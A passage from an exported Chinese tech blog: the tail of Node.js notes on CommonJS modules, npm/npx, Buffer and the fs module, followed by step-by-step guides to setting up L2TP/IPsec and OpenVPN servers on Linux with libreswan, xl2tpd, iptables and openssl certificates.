文件名.js即可运行指定名字的js文件中的代码。 模块化ES标准的缺陷：没有模块系统（ES6新增）、标准库较少、没有标准接口、缺乏管理系统。模块化可以有多种形式，但至少应该提供能够将代码分割为多个源文件的机制；CommonJS的模块功能可以帮我们解决该问题。 CommonJS规范它的提出主要是为了弥补当前JS没有标准的缺陷。它对模块的定义十分简单：即模块引用、模块定义和模块标识。 模块分为两大类： 核心模块：由node引擎提供的模块。核心模块的标识就是模块的名字。 文件模块：由用户自己创建的模块。文件模块的标识就是文件的路径，常用相对路径。注意不要使用路径前的.或..。 require()函数在node中有一个全局对象global，它的作用和网页中的window类似；在全局中创建的变量都会作为global的属性保存，在全局中创建的函数都会作为global的方法保存。（注意在js中，声明变量时如果不用var，即用a = 10的方式声明，则该变量自动为全局变量。）当node在执行模块中的代码时，它会首先在代码的最顶部添加如下代码（右 大括号在代码底部添加）：function(exports,require,module,__filename,__dirname)&#123;&#125;实际上模块中的代码都是包装在这个函数中执行的，并且在函数执行时同时传递进了5个实参： exports：该对象用来将变量或函数暴露到外部 require：函数，用来引入外部模块 module：它代表的就是当前模块本身，**exports就是module的属性**。既可以使用exports导出，也可以使用module.exports导出。 __filename：当前模块的完整路径（最后一级是该模块的名字） __dirname：当前模块所在文件夹的完整路径（最后一级是该模块所在文件夹的名字） 在node中，一个js文件就是一个模块。在node中，每一个js文件中的js代码都是独立运行在一个函数中，而不是全局作用域。每个模块之间都是闭包。 所以虽然在被引入的模块里，有些东西看起来是定义在全局里的，也无法直接访问到。是因为相当于在外面又套了一层function()&#123;&#125;。一个模块中的变量和函数在其他模块中无法访问。 通过require()函数来引入外部模块。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150使用```require()```引入模块后，该函数会返回一个对象，这个对象（如下面的```md```）代表的是引入的模块。```var md = require(&quot;./temp.js&quot;)```使用```require()```引入外部模块时使用的就是模块标识。我们可以通过模块标识来找到指定的模块。### 暴露可以通过```exports```来向外部暴露变量和方法，将需要暴露给外部的变量或方法设置为exports的属性即可，即```exports.xxx=...```。```exports.x = &quot;w我是temp.js中的x&quot;```关于exports 和 module.exports```exports```只能使用```.```的方式向外暴露内部变量，如```exports.xxx = xxx```。而```module.exports```既可以通过```.```的方式，也可以直接赋值，如```module.exports.xxx = xxx```或```module.exports = &#123;&#125;```。## npm和包包实际上就是一个压缩文件，解压后还原为目录。CommonJS的包规范由**包结构**（用于组织包中的各种文件）和**包描述文件**（描述包的相关信息，以供外部读取分析）两个部分组成。 符合规范的目录应该包含如下文件：——**package.json** 描述文件（只有这个是必须的，其他四个可选）。里面的字段有name、description、version等。可以通过```npm init```生成。&gt; ```npm init```和```npm init -y```命令的作用是： 对项目进行初始化操作，对包进行管理。&gt; -y 的含义：yes的意思，在init的时候省去了敲回车的步骤，生成的都是默认的package.json。——bin 可执行二进制文件——lib JS代码——doc 文档——test 单元测试&gt; .json文件中不支持写注释。NPM（Node Package Manager）：帮助Node完成了第三方模块的发布、安装和依赖等。它不需要安装，安装完node之后自带npm。**通过npm下载的包都放到node_modules文件夹中，**通过npm下载的包直接通过包名引入即可。node在使用模块名字来引入模块时，它会首先在当前目录的node_modules中寻找是否含有该模块。如果有则直接使用，如果没有则去上一级目录的node_modules找；没有再找上一级，直到找到为止。直到找到磁盘的根目录。如果依然没有，则报错。 ——```npm -v```：查看版本——```npm search 包名```：搜索模块包——```npm install 包名```：在**当前目录**安装包——```npm install 包名 -g```：全局模式安装包。全局安装的包一般都是一些工具。 ——```npm remove 包名```：删除包**——```npm install 包名 --save```：安装包并添加到依赖中（package.json--dependencies)。再配合```npm install```可直接下载当前项目所依赖的包并创建node_modules文件夹**。```npm remove 包名 --save```类似，也是从依赖中同时删除。&gt; 需要注意 package.json 中 name 字段不能和取成包的名字！ 否则下载同样名字的包时会报错。——```npm config set registry 地址```：设置镜像源——```npm install 包名 -registry=地址```：从镜像源安装&gt; cnpm&gt; npm服务器在美国，在下载包的时候可能会遇到一些问题。可以直接搜索淘宝的cnpm查看教程。## 补充：npx&gt; npx侧重于执行命令——执行某个模块命令。虽然会自动安装模块，但是重在执行某个命令。&gt; npm侧重于安装或者卸载某个模块的。重在安装，并不具备执行某个模块的功能。npm从5.25.2版开始，增加了 npx 命令，方便在项目中使用全局包。Node安装后自带npm模块，可以直接使用npx命令。如果不能使用，就要手动安装一下：```npm install -g npx```。npx想要解决的主要问题就是调用项目内部安装的模块。npx 的原理很简单，就是运行的时候，会到node_modules/.bin路径和环境变量$PATH里面，检查命令是否存在。比如，项目内部安装了测试工具webpack：```npm install webpack -D```（这里的```-D```是把依赖安装到开发依赖的意思）。如果我们使用webpack，只能在项目脚本的 package.json 中的scripts字段里面， 如果想在命令行下调用，必须像这样：```node-modules/.bin/webpack -v```。而npx 可以让项目内部安装的模块用起来更方便，只要像下面这样调用就行了：```npx webpack -v```。下载全局模块时，npx 允许指定版本：```npx webpack@4.44.1 ./src/index.js -o ./dist/main.js```。此代码指定使用 4.44.1 版本的webpack进行打包操作。注意，只要 npx 后面的模块无法在本地发现，就会下载同名模块。比如，本地没有安装webpack-dev-server模块，```npx webpack-dev-server```命令会自动下载该模块，在当前目录启动一个 Webpack dev 服务。如果想让 npx 强制使用本地模块，不下载远程模块，可以使用--no-install参数。如果本地不存在该模块，就会报错。```npx --no-install webpack-dev-server```。反过来，如果忽略本地的同名模块，强制安装使用远程模块，可以使用```--ignore-existing```参数。比如，本地已经全局安装了create-react-app，但还是想使用远程模块，就用这个参数：```npx --ignore-existing create-react-app my-react-app```。由于 npx 会检查环境变量$PATH，所以系统命令也可以调用：```npx ls // 等同于ls命令```。另外,使用npx可以避免全局安装模块，比如，```create-react-app```这个模块是全局安装，npx 可以运行它，而且不进行全局安装：```npx create-react-app my-react-app```。上面代码运行时，npx 将create-react-app**下载到一个临时目录，使用以后再删除。所以，以后再次执行上面的命令，会重新下载**create-react-app。还可以利用 npx 指定某个版本的 Node 运行脚本。```npx node@14.10.0 -v```命令会使用 14.10.0 版本的 Node 执行脚本。原理是从 npm 下载这个版本的 node，使用后再删掉。某些场景下，这个方法用来切换 Node 版本，要比 nvm 那样的版本管理器方便一些。## Buffer（缓冲区）&gt; JS已经有数组了，为什么还需要Buffer？&gt; JS的数组功能虽然也很强大，可以存储数字、字符串等各种数据类型，但在客户端和服务器的通信过程中，客户端给服务器发请求，服务器给客户端返回响应。如果服务器返回的是图片或者音视频文件，传统的数组array无法存储这些。&gt; 要存储这些**二进制文件**，就要用到buffer。**buffer构造函数都是不推荐使用的，官网标注为“已废弃”。****buffer的大小一旦确定则不能修改。**buffer实际上是对底层内存的直接操作。Buffer的结构和数组很像，操作的方法也和数组类似，它的元素是十六进制的两位数，范围是00 - ff。）不过数组中不能存储二进制的文件，而buffer就是专门用来存储二进制数据的，它只不过都是以十六进制的形式显示，由计算机的特性决定，因为二进制看起来太长了。如果将一个字符串保存到buffer中：```var str = &quot;Hello&quot; var buf = Buffer.from(str)```，再对buf进行打印，结果为```&lt;Buffer 48 65 6c 6c&gt;```。 &gt; 为什么是到ff，也就是255？&gt; 因为在计算机中，一个0或一个1我们称之为是一位（1bit）。而8bit=1byte（字节）。&gt; 也就是buffer中的一个元素就占用内存的一个字节。&gt; 注意，只要数字在控制台或页面中输出一定是10进制。需要注意的是，**buf.length**获取的是占用内存的大小，单位为byte。而**str.length**指的是字符串的长度。当字符串中的字符存在中文时既有明显的差别。Buffer是nodejs的核心之一，使用buffer不需要引入模块，直接使用即可。### buffer的相关方法可以去Node.js中文网查看完整文档。+ 创建指定大小的buffer：```var buf = Buffer.alloc(10) //创建一个10字节的buffer```。会在内存中分配一个长度为10的**连续**空间，可以通过索引来操作buf中的元素：```buf[2] = 0xaa```。 还有个```var buf = Buffer.allocUnSafe(10)```，也是创建一个指定大小为10字节的buffer，但是buffer中可能含有敏感数据。也就是alloc分配空间的同时清空数据，但allocUnSafe只分配，不清空数据。 &gt; Buffer大小一旦确定，则不能修改；不会像数组一样如果给一个索引超出长度的元素赋值就直接把数组长度变大的情况。Buffer实际上是对底层内存的直接操作。 &gt; alloc：allocate，分配。+ 将buffer缓冲区中的数据转换为字符串：```buf.toString()```## FS（文件系统）文件系统简单来说就是通过node来操作系统中的文件。fs模块提供了一些标准文件访问API来打开、读取、写入文件以及与其交互。&gt; &lt;span style=&quot;color:red&quot;&gt;注意在写文件路径时，路径里的单斜杠&quot;\\\\&quot;可能会被当作转义字符，导致不能正确读取文件路径。把单斜杠变成双斜杠```\\\\```即可。也可以换成向左的斜杠```/```。&lt;/span&gt; 要使用fs模块，首先需要对其进行加载：```const fs = require(&quot;fs&quot;)```。fs是核心模块，直接引入而无需下载。（buffer模块甚至不需要引入。）+ fs模块中所有的操作都有两种形式可以选择：&lt;span style=&quot;color:red&quot;&gt;同步和异步&lt;/span&gt;。去官网看它的方法，发现都是一对对的，一个带Sync的（同步方法）和 一个不带的（异步方法）。 + 同步文件系统会&lt;span style=&quot;color:red&quot;&gt;阻塞&lt;/span&gt;程序的执行，也就是除非操作完毕，否则不会向下执行代码。 + 异步文件系统&lt;span style=&quot;color:red&quot;&gt;不会阻塞&lt;/span&gt;程序的执行，而是在操作完成时通过回调函数将结果返回。 + 在方法的参数中，异步函数通常都有一个回调函数```callback```。因为异步函数需要通过回调函数在操作完成时返回结果，同步函数直接用```return```返回了。### 同步和异步文件写入#### 同步文件写入手动操作的步骤：1.打开文件 2.向文件中写入内容 3.保存并关闭文件。用fs，步骤如下：1. 打开文件：```fs.openSync(path,flags[,mode])- path：要打开文件的路径- flags：打开文件要做的操作的类型。r - 只读的 w - 可写的- mode：设置文件的操作权限，一般不传- 返回值：该方法会返回一个文件的描述符作为结果，可以通过该描述符对文件进行各种操作。2. 向文件中写入内容：```fs.writeSync(fd,string[,position[,encoding]])- fd：文件的描述符，需要传递要写入的文件的描述符- string：要写入的内容- position：写入的起始位置，一般不传- encoding：写入的编码，默认utf-8。一般不传3. 保存并关闭文件：```fs.closeSync(fd)```- fd：要关闭的文件的描述符#### 异步文件写入异步调用的方法，结果都是通过回调函数**的参数**```arguments```返回的。异步文件写入的步骤如下：1. 打开文件：```fs.open(path,flags[,mode],callback)```。比同步就多了个callback。- callback：不可省略！ &lt;span style=&quot;color:red&quot;&gt;回调函数的两个参数：1.```err```：错误对象，没出错则为null 2.```fd```：文件的描述符。&lt;/span&gt;2. 异步写入文件：```fs.write(fd,string[,position[,encoding]],callback)```。&lt;span style=&quot;color:red&quot;&gt;在打开文件的回调函数中，如果没有出错，则对文件进行写入操作。&lt;/span&gt;&lt;span style=&quot;color:red&quot;&gt;回调函数的两个参数：1.```err```：错误对象，没出错则为null 2.```written```：指定传入的字符串被写入多少字节。3.```string```：写入的内容。&lt;/span&gt;后面两个参数意义不大，写入内容在```fs.write```的参数中控制。 3. 保存并关闭文件：```fs.close(fd)``` - callback：不可省略！ &lt;span style=&quot;color:red&quot;&gt;回调函数只有一个可能的异常参数。&lt;/span&gt;### 简单文件写入第一种：```fs.writeFile(file,data[,options],callback)```第二种：```fs.writeFileSync(file,data[,options])```- file：要操作的文件的路径- data：要写入的数据- options：选项，可以对写入进行一些设置- callback：当写入完成后执行的函数用法如下：```javascriptvar fs = require(&quot;fs&quot;)fs.writeFile(&quot;hello.txt&quot;, &#x27;这是通过writeFile写入的内容&#x27;, &#123;flag:&quot;w&quot;&#125;, function(err)&#123; if(!err)&#123; console.log(&#x27;写入成功！&#x27;) &#125;&#125;)； options的几个可选值如下：常用的有r, r+, w, a。注意w是截断，a可以追加。r+如果输入的内容少于之前的，则从左往右替换，剩余的依然存在；如果多余之前的则全部替换之前的内容；是从头开始替换原文本而非插入。 流式文件写入以上几种写入都存在一个问题，就是它们是一次性的将一个内容写入一个文件里，因此在写入之前需要把要写入的东西一下子全部准备好。如果文件过大、内容过多，就会导致占用内存过大。同步、异步和简单文件写入，都不适合大文件的写入。性能较差，容易导致内存溢出。流式文件写入就相当于往文件上加了个水管。只要水管还在，就可以一直输送内容。 创建一个可写流：fs.createWriteStream(path[,options])。 path：文件路径 options：配置的参数 可以通过监听流的open.close事件来监听流的打开和关闭：流名.on(&quot;open&quot;,callback)，或把open换成close。但open事件只会触发一次，因为打开只有一次，而事件触发完之后函数依然在。这就说明，open事件是一个一次性的事件，没有必要用on，而是用流名.once(&quot;open&quot;,callback)。close同理。 on(事件字符串，回调函数)：可以为对象绑定一个事件 once(事件字符串，回调函数)：可以为对象绑定一个一次性的事件，该事件将会在触发一次以后自动失效。 上面的on是jquery里的写法，适用于绑定一个长期有效的事件。而once用来绑定一个一次性的事件。在这里使用这两个，运行效果是一样的。 关闭流：流名.end();。如果把流的传输想象成水缸A的水通过一个管子流向水缸B，这个方法相当于把管子从A拿走了，但另一头还在B，开始传输的东西会继续传输完才会完全关闭流。还有一个方法是流名.close()，这个方法就相当于把管子从B拿走，性能和计算机性能有关，性能好的话close()没执行就已经向文件写完了，所以会出现正常全部写入的情况。但性能不好的话，可能就无法传输完要传输的内容，流就已经关闭了。 用法如下： 1234567891011var fs = require(&quot;fs&quot;)var ws = fs.createWriteStream(&quot;hihi.txt&quot;) // 这就创建了可写流// 监听可写流的开启和关闭ws.once(&quot;open&quot;, function () &#123; console.log(&quot;流打开了&quot;); &#125;);ws.once(&quot;close&quot;, function () &#123; console.log(&quot;流关闭了&quot;); &#125;);ws.write(&quot;通过可写流写入文件的内容&quot;)ws.write(&quot;又写了&quot;)ws.write(&quot;又又写了&quot;)ws.close(); 同步和异步文件读取类似同步和异步文件的写入过程，先open，再fs.read()或fs.readSync()，再close。 简单文件读取通过fs.readFile(path[,options],callback)和fs.readFileSync(path[,options])。 path：要读取的文件的路径 options：读取的选项（操作符、权限等），一般不写 callback：回调函数，通过回调函数将读取到的内容返回(err,data) err：错误对象 data：读取到的数据，会返回一个buffer。如果是文本文件，可以通过data.toString()来转换成正常的结果。如果是图片等其它类型的文件，就体现出buffer的好处了。 用法如下： 123456789101112var fs = require(&quot;fs&quot;)fs.readFile(&quot;test.jpg&quot;,function(err,data)&#123; if(!err)&#123; // 1.打印读取到的内容： // console.log(data.toString()); // 2.将data写入到文件中 fs.writeFile(&quot;hihi.jpg&quot;,data,function(err)&#123; if(!err)&#123; console.log(&quot;图片文件写入成功！&quot;);&#125; &#125;) &#125;&#125;) 流式文件读取(初级方法)流式文件读取也适用于一些比较大的文件，可以分多次将文件读取到内存中。如果要读取一个可读流的数据，必须要为可读流绑定一个data事件，data时间绑定完毕，它会自动开始读取数据；读取完了还会自动关闭，所以不需要专门去关闭可读流。关于读取到的数据的去向，可读流读取到的数据都是通过参数返回的，也就是下面示例的参数data（这个名字是我们自己起的）。而且参数是没有err的，因为这个事件一旦触发，就不可能再出错了。如果在打印data的地方同时打印console.log(data.length)，会发现结果是65536。 用法如下： 1234567891011121314151617181920212223var fs = require(&quot;fs&quot;)// 创建一个可读流读取数据var rs = fs.createReadStream(&quot;test.mp3&quot;) // 创建一个可写流接收数据var ws = fs.createWriteStream(&quot;hihi.mp3&quot;) // 监听【可读】流和【可写】流的开启和关闭rs.once(&quot;open&quot;, function () &#123; console.log(&quot;可读流打开了&quot;); &#125;);rs.once(&quot;close&quot;, function () &#123; console.log(&quot;可读流关闭了&quot;); // 数据读取完毕，在这里关闭可写流： ws.end();&#125;);ws.once(&quot;open&quot;, function () &#123; console.log(&quot;可写流打开了&quot;); &#125;);ws.once(&quot;close&quot;, function () &#123; console.log(&quot;可写流关闭了&quot;); &#125;);rs.on(&quot;data&quot;,function(data)&#123; // console.log(data); // 将读取到的数据写入到可写流 ws.write(data) // 不可以在这里关闭可写流ws.end()!这就会导致只读了一条数据就把可写流给关了。&#125;) 流式文件读取(简单方法)方法pipe()：将可读流中的内容直接输出到可写流中。不需要再额外执行操作关闭可读流和可写流，pipe()会自动完成。用法如下： 1234567891011121314var fs = require(&quot;fs&quot;)// 创建一个可读流读取数据var rs = fs.createReadStream(&quot;test.mp3&quot;) // 创建一个可写流接收数据var ws = fs.createWriteStream(&quot;hihi.mp3&quot;) // 监听【可读】流和【可写】流的开启和关闭rs.once(&quot;open&quot;, function () &#123; console.log(&quot;可读流打开了&quot;); &#125;);rs.once(&quot;close&quot;, function () &#123; console.log(&quot;可读流关闭了&quot;); &#125;);ws.once(&quot;open&quot;, function () &#123; console.log(&quot;可写流打开了&quot;); &#125;);ws.once(&quot;close&quot;, function () &#123; console.log(&quot;可写流关闭了&quot;); &#125;);// 简单方法：利用可读流的pipe()方法。在可读流和可写流中间架起一个管道，直接传输。rs.pipe(ws); fs模块的其他方法 验证路径是否存在：fs.existsSync(path)，返回boolean。可查看文件是否存在。异步方法已经弃用。 获取文件信息：fs.stat(path,callback)和fs.statSync(path)，返回一个对象，保存了当前对象状态的相关信息。 删除文件：fs.unlink(path,callback)和fs.unlinkSync(path)。 列出文件：fs.readdir(path,callback)和fs.readdirSync(path[,options])。读取一个目录的目录结构。回调函数的参数files是一个字符串数组，每一个元素就是一个文件或文件夹的名字。 截断文件，将文件修改为指定的大小：fs.truncate(path,len,callback)和fs.truncateSync(path,len)。这里的len是字节数。 建立目录：fs.mkdir(path[,mode],callback)和fs.mkdirSync(path[,mode])。 删除目录：fs.rmdir(path,callback)和fs.rmdirSync(path)。 重命名文件和目录：fs.rename(oldpath,newpath,callback)和fs.renameSync(oldpath,newpath)。 监视文件修改：fs.watchFile(filename[,options],listener)。","categories":[{"name":"后端","slug":"后端","permalink":"https://avalooooooon.github.io/categories/%E5%90%8E%E7%AB%AF/"},{"name":"node.js","slug":"后端/node-js","permalink":"https://avalooooooon.github.io/categories/%E5%90%8E%E7%AB%AF/node-js/"}],"tags":[{"name":"node.js","slug":"node-js","permalink":"https://avalooooooon.github.io/tags/node-js/"}]},{"title":"搭建L2TP-IPsec","slug":"搭建L2TP-IPsec","date":"2022-02-20T07:20:43.000Z","updated":"2022-02-20T07:20:43.000Z","comments":true,"path":"2022/02/20/搭建L2TP-IPsec/","link":"","permalink":"https://avalooooooon.github.io/2022/02/20/%E6%90%AD%E5%BB%BAL2TP-IPsec/","excerpt":"","text":"1. 前言虚拟专用网络（VPN，Virtual Private Network）是一种网络底层协议，主机开启 VPN 后，所有网络请求都会先发送到 VPN 服务器，然后 VPN 服务器作为代理帮我们访问敏感资源。本文介绍如何在 Linux（Ubuntu 18.04）服务器上搭建 L2TP&#x2F;IPsec VPN。 1.5 在自己的终端配置连接服务器：ssh root@服务器ip -p 端口号查看配置文件：cat /etc/ssh/sshd_config修改配置文件：vim /etc/ssh/sshd_config 2. IPSec互联网安全协议（IPsec，Internet Protocol Security）是 OSI 第三层的安全协议，工作分传输模式和隧道模式，传输模式为自己传输信息，隧道模式为给上层协议提供安全隧道。此处使用隧道模式给上层 VPN 协议提供安全隧道。软件使用开源的 libreswan。 安装： 1sudo apt-get install libreswan 验证安装成功： 1ipsec --version 新建软件配置文件： 1sudo vim /etc/ipsec.d/l2tp-ipsec.conf 写入： 1234567891011121314151617conn L2TP-PSK-NAT rightsubnet=vhost:%priv also=L2TP-PSK-noNATconn L2TP-PSK-noNAT authby=secret pfs=no auto=add keyingtries=3 rekey=no ikelifetime=8h keylife=1h type=transport left=&lt;服务器公网 IP&gt; leftprotoport=17/1701 right=%any rightprotoport=17/%any 新建预共享密钥文件： 1sudo vim /etc/ipsec.d/l2tp-ipsec.secrets 写入： 1&lt;服务器公网 IP&gt; %any : PSK &quot;&lt;IPSec 密钥&gt;&quot; 编辑系统配置文件： 1sudo vim /etc/sysctl.d/99-ipsec.conf 末尾添加： 12345678910net.ipv4.ip_forward = 1net.ipv4.conf.default.rp_filter = 0net.ipv4.conf.all.send_redirects = 0net.ipv4.conf.default.send_redirects = 0net.ipv4.conf.all.log_martians = 0net.ipv4.conf.default.log_martians = 0net.ipv4.conf.default.accept_source_route = 0net.ipv4.conf.all.accept_redirects = 0net.ipv4.conf.default.accept_redirects = 0net.ipv4.icmp_ignore_bogus_error_responses = 1 更新系统配置： 1sudo sysctl -p 试运行： 12sudo systemctl start ipsecipsec verify 可添加至开机启动： 1sudo systemctl enable ipsec 3. PPPL2TP 协议基于 PPP 协议，因此需先确保 PPP 协议正常运行。 安装： 1sudo apt-get install ppp 新建配置文件： 1sudo vim /etc/ppp/options.xl2tpd 写入： 1234567891011121314require-mschap-v2ms-dns 8.8.8.8ms-dns 8.8.4.4asyncmap 0authcrtsctslockhide-passwordmodemdebugname l2tpdproxyarplcp-echo-interval 30lcp-echo-failure 4 编辑 PPP 用户名及密码文件： 1sudo vim /etc/ppp/chap-secrets 末尾添加： 1&lt;用户名&gt; * &lt;密码&gt; * 4. L2TP第二层隧道协议（L2TP，Layer 2 Tunneling Protocol）顾名思义是一个OSI 第二层协议。软件使用开源的 xl2tpd。 安装： 1sudo apt-get install xl2tpd 编辑配置文件： 1sudo vim /etc/xl2tpd/xl2tpd.conf 末尾添加： 1234567891011[global]ipsec saref = yes[lns default]ip range = 10.1.2.2-10.1.2.254local ip = 10.1.2.1refuse chap = yesrefuse pap = yesrequire authentication = yesppp debug = yespppoptfile = /etc/ppp/options.xl2tpdlength bit = yes 试运行： 1sudo systemctl start xl2tpd 然后在用户机上尝试连接 VPN，协议选择 L2TP，密钥、用户名和密码分别为刚才设置的 IPSec 密钥、PPP 用户名和 PPP 密码。应该能够连接成功，但还不能访问互联网。 可添加至开机启动： 1sudo systemctl enable xl2tpd 查看l2tp日志： 1systemctl status xl2tpd 5. 系统防火墙使用系统自带的 iptables 软件管理系统防火墙。 向 iptables 缓存添加策略，在其 NAT 表的 POSTROUTING 链中设置 IP 伪装： 1sudo iptables -t nat -A POSTROUTING -s 10.1.2.0/24 -o eth0 -j MASQUERADE -m comment --comment &quot;xl2tp&quot; 将当前策略保存至配置文件，然后应用策略： 12sudo iptables-save &gt; /etc/network/iptablessudo iptables-apply -w /etc/network/iptables ptables-persistant netfilter-persistant然后netfilter-persistant save就能持久化 centos7:&#x2F;etc&#x2F;sysconfig&#x2F;iptables 重启 xl2tpd 服务： 1sudo systemctl restart xl2tpd 此时用户机应该就能通过 VPN 访问互联网了。 可修改网络配置文件，使连接网络时自动加载 iptables 配置： 1sudo vim /etc/network/interfaces 末尾添加： 1pre-up iptables-restore &lt; /etc/network/iptables 6. 参考资料 centos7 搭建 xl2tpd 服务 Ubuntu iptables 配置","categories":[{"name":"vpn","slug":"vpn","permalink":"https://avalooooooon.github.io/categories/vpn/"}],"tags":[{"name":"vpn","slug":"vpn","permalink":"https://avalooooooon.github.io/tags/vpn/"}]},{"title":"OpenVPN","slug":"OpenVPN","date":"2022-02-20T06:10:04.000Z","updated":"2022-02-20T06:10:04.000Z","comments":true,"path":"2022/02/20/OpenVPN/","link":"","permalink":"https://avalooooooon.github.io/2022/02/20/OpenVPN/","excerpt":"","text":"简介OpenVPN 是基于 TLS 加密层实现 VPN 的开源项目。 安装在自己的终端配置连接服务器：ssh root@服务器ip -p 端口号查看配置文件：cat /etc/ssh/sshd_config修改配置文件：vim /etc/ssh/sshd_config Linux 服务端(debian10)登录服务端：除了ssh方式，也可以通过用户名密码方式。参考了这篇文章。端口号可以在服务器后台查阅ssh server。 1ssh -p port user@IP 安装软件包（包含客户端与服务端）： 12sudo apt-get update &amp;&amp; sudo apt-get install openvpnopenvpn --version # 验证 生成自签 CA、服务器证书及额外所需密钥： 123456789101112131415161718192021222324252627282930313233343536373839404142434445cd /etc/openvpn sudo cat &lt;&lt;EOF | sudo tee openvpn.cnf[ v3_ca ]basicConstraints = critical, CA:TRUEsubjectKeyIdentifier = hashauthorityKeyIdentifier = keyid:always, issuer:alwayskeyUsage = critical, cRLSign, digitalSignature, keyCertSign [ v3_ica ]basicConstraints = critical, CA:TRUE, pathlen:1subjectKeyIdentifier = hashauthorityKeyIdentifier = keyid:always, issuer:alwayskeyUsage = critical, cRLSign, digitalSignature, keyCertSign [ v3_server ]basicConstraints = critical, CA:FALSEsubjectKeyIdentifier = hashauthorityKeyIdentifier = keyid:always, issuer:alwayskeyUsage = critical, nonRepudiation, digitalSignature, keyEncipherment, keyAgreement extendedKeyUsage = critical, serverAuth [ v3_client ]basicConstraints = critical, CA:FALSEsubjectKeyIdentifier = hashauthorityKeyIdentifier = keyid:always, issuer:alwayskeyUsage = critical, nonRepudiation, digitalSignature, keyEnciphermentextendedKeyUsage = critical, clientAuthEOF sudo openssl genrsa -out ca.key 4096sudo openssl rand -writerand ~/.rndsudo openssl req -new -key ca.key -subj &quot;/CN=US/ST=NewYork/L=New York City/O=DigitalOcean/OU=Community/CN=ca/emailAddress=admin@example.com&quot; -out ca.csrsudo openssl x509 -req -days 36500 -signkey ca.key -extfile openvpn.cnf -extensions v3_ca -in ca.csr -out ca.crtsudo rm ca.csr sudo openssl genrsa -out server.key 4096sudo openssl rand -writerand ~/.rndsudo openssl req -new -key server.key -subj &quot;/C=US/ST=NewYork/L=New York City/O=DigitalOcean/OU=Community/CN=server/emailAddress=admin@example.com&quot; -out server.csrsudo openssl x509 -req -days 36500 -CA ca.crt -CAkey ca.key -CAcreateserial -extfile openvpn.cnf -extensions v3_server -in server.csr -out server.crtsudo rm server.csr sudo openssl dhparam -out dh.key 2048 # 此步将耗时数分钟 sudo openvpn --genkey --secret ta.key # 用于 OpenVPN TLS-auth 功能的密钥 从例子拷贝配置文件： 123cd /etc/openvpnsudo cp /usr/share/doc/openvpn/examples/sample-config-files/server.conf.gz .sudo gzip -d server.conf.gz 由于版本不同，server.conf的路径也可能不同。如果上述路径找不到server.conf文件，可以尝试路径&#x2F;etc&#x2F;openvpn&#x2F;server&#x2F;server.conf。比如openvpn版本为2.4.11时，可以将命令修改如下：cp -p /usr/share/doc/openvpn-2.4.11/sample/sample-config-files/server.conf /etc/openvpn/cat /etc/openvpn/server.conf 修改配置文件： 1vim server.conf 修改 port(默认为1194，可以出现问题再修改，但要和客户端保持一致）。 修改协议为 UDP。 检查 ca：ca.crt、cert：server.crt、key：server.key、dh：dh.key、tls-auth：ta.key相对于配置文件夹的相对路径（或绝对路径）。注意检查每种证书只在一行出现，否则后面的行会覆盖掉前面行的值(tls-auth：ta.key的位置较为靠后）。 注释掉explicit-exit-notify 1（该功能仅用于 UDP 模式）。 启动服务： 1sudo systemctl start openvpn@server 开启系统转发功能： 1234cat &lt;&lt;EOF | sudo tee /etc/sysctl.d/99-openvpn.confnet.ipv4.ip_forward = 1EOFsudo sysctl --system 配置 iptables 转发： 1sudo iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE -m comment --comment &quot;openvpn&quot; 查看服务器日志： 1systemctl status openvpn@server Linux 客户端安装软件包同服务端。 生成密钥文件client.key及证书请求文件client.csr： 1234cd /etc/openvpnsudo openssl genrsa -out client.key 4096sudo openssl rand -writerand ~/.rndsudo openssl req -new -key client.key -subj &quot;/C=US/ST=NewYork/L=New York City/O=DigitalOcean/OU=Community/CN=client/emailAddress=admin@example.com&quot; -out client.csr OpenVPN 服务器会将 CN 名作为多个客户端时的区分标志，客户端应各自使用不同的 CN 名。 将client.csr拷贝至 CA 端： 123cd /etc/openvpnrm client.csr vim client.csr 由 CA 端签发证书client.crt： 1sudo openssl x509 -req -days 36500 -CA ca.crt -CAkey ca.key -CAcreateserial -extfile openvpn.cnf -extensions v3_client -in client.csr -out client.crt 将client.crt及ca.crt、ta.key拷贝至客户端，直接复制文本内容即可： 123cat client.crtcat ca.crtcat ta.key CA 端可清除文件： 1sudo rm client.csr client.crt client 端可清除文件： 1sudo rm client.csr 复制配置文件： 12cd /etc/openvpnsudo cp /usr/share/doc/openvpn/examples/sample-config-files/client.conf . 修改配置文件： 修改 remote 为服务器地址及 port。 修改协议为 UDP！。 检查 ca：ca.crt、cert：client.crt、key：client.key、tls-auth：ta.key相对于配置文件夹的相对路径。 末尾添加：auth-nocache以避免在内存中缓存认证信息（否则会报 warning）。 末尾添加：redirect-gateway def1 bypass-dhcp，将系统默认路由网关改为 OpenVPN 虚拟对端网卡。 末尾添加：dhcp-option DNS 8.8.8.8，设置连接 OpenVPN 后使用的 DNS 服务器。 启动服务： 1sudo systemctl start openvpn@client ping VPN 网关进行测试： 1ping 10.8.0.1 Windows 客户端去官网-&gt;Community-&gt;Downloads 下载 OpenVPN GUI 安装器并安装。 配置方法与 Linux 几乎一致。只是配置文件夹为%USERPROFILE%/OpenVPN/config，客户端配置模版文件为C:/Program Files/OpenVPN/sample-config/client.ovpn。 生成密钥文件client.key及证书请求文件client.csr： 1234cd C:\\Users\\28422\\OpenVPN\\configopenssl genrsa -out client.key 4096openssl rand -writerand .rnd # 配置文件夹就地新建.rnd随机数种子openssl req -new -key client.key -subj &quot;/C=US/ST=NewYork/L=New York City/O=DigitalOcean/OU=Community/CN=client2/emailAddress=admin@example.com&quot; -out client.csr # gitbash会报错，需要在powershell中运行 OpenVPN 服务器会将 CN 名作为多个客户端时的区分标志，客户端应各自使用不同的 CN 名。 将client.csr拷贝至 CA 端： 123cd /etc/openvpnrm client.csr vim client.csr 由 CA 端签发证书client.crt： 1sudo openssl x509 -req -days 36500 -CA ca.crt -CAkey ca.key -CAcreateserial -extfile openvpn.cnf -extensions v3_client -in client.csr -out client.crt 将client.crt及ca.crt、ta.key拷贝至客户端，直接复制文本内容即可： 123cat client.crtcat ca.crtcat ta.key CA 端可清除文件： 1sudo rm client.csr client.crt client 端可清除文件： 1rm client.csr 修改配置文件C:&#x2F;Program Files&#x2F;OpenVPN&#x2F;sample-config&#x2F;client.ovpn： 修改 remote 为服务器地址及 port。 修改协议为UDP。 检查 